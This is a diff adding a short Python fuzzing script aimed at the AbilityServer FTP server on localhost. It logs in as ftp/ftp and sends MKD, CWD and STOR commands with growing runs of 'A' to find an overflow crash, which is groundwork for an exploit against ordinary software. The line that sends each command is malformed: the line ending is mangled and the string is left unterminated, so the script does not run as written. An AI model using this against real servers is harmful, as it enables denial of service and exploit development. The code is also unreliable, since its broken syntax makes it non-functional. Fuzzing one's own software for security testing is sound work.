@@ -1,0 +1,29 @@
+#!/usr/bin/python
+
+# Script to know where AbilityServer crash with a fuzzing method
+
+import socket
+
+buffer=["A"]
+counter=20
+while len(buffer) <= 100:
+    buffer.append("A"*counter)
+    counter=counter+20
+    
+commands=["MKD","CWD","STOR"]
+
+for command in commands:
+    for string in buffer:
+        print("Fuzzing" + command + ":" + str(len(string)))
+        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        connect=s.connect(('127.0.0.1',21))
+        s.recv(1024)
+        s.send(bytes('USER ftp\r\n'))
+        s.recv(1024)
+        s.send(bytes('PASS ftp\r\n'))
+        s.recv(1024)
+        s.send(bytes(command + ' '+ string + 'r\n\'))
+        s.recv(1024)
+        s.send(bytes('QUIT\r\n'))
+        s.close()
+        
